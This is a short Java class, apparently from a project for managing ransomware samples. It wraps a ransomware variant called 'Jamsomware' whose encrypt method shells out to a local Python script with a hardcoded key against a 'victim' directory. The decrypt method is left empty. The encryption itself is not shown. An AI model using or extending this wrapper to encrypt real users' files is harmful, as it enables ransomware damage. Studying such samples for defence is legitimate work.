package ransomware;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import ransomware.Ransomware;

public class Jamsomware extends Ransomware {

    public Jamsomware(int id, String name, String description) {
        super(id, name, description);
    }

    @Override
    public void encrypt(String victimDir) throws Exception {
        Process p = Runtime.getRuntime().exec("python3 /home/gochi/Proyectos/GestionRansomware/jamsomware.py --key clave --dir " + victimDir);
        System.out.println("python3 /home/gochi/Proyectos/GestionRansomware/jamsomware.py --key clave --dir " + victimDir);
        p.waitFor();
        
        InputStream stdout = p.getInputStream ();
        BufferedReader reader = new BufferedReader (new InputStreamReader(stdout));
        
        String linea;
        while ((linea = reader.readLine()) != null) {
            System.out.println(linea);
        }
        
        p.destroy();
    }

    @Override
    public void decrypt(String victimDir) throws Exception {
        
    }

}
